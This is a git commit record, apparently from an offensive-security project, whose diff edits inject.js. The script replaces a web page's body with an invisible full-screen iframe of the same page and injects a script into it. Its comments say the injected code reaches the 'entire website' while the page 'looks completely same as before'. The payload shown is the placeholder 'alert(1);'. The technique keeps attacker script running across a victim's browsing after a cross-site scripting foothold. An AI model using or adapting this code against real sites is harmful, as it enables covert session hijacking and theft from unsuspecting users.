437ef6cdab0626246940c9649928ba4d93d7f70e
rekcah-eht <77259089+rekcah-eht@users.noreply.github.com>
2021-01-11 14:39:54 +0900

    Update inject.js

--- inject.js
+++ inject.js
@@ -4,6 +4,6 @@ function inject_js(){
     script_tag.innerHTML = "alert(1);" // <- this is the script that will be injected to entire website
 }
 
-iframe_tag = '<iframe src="'+ location.href+ '" style="display:block; width:100vw; height: 100vh; border: none" id="iframe" onload="inject_js()"></iframe>';
+var iframe_tag = '<iframe src="'+ location.href+ '" style="display:block; width:100vw; height: 100vh; border: none" id="iframe" onload="inject_js()"></iframe>';
 
 document.getElementsByTagName('body')[0].innerHTML = iframe_tag // the website looks completely same as before
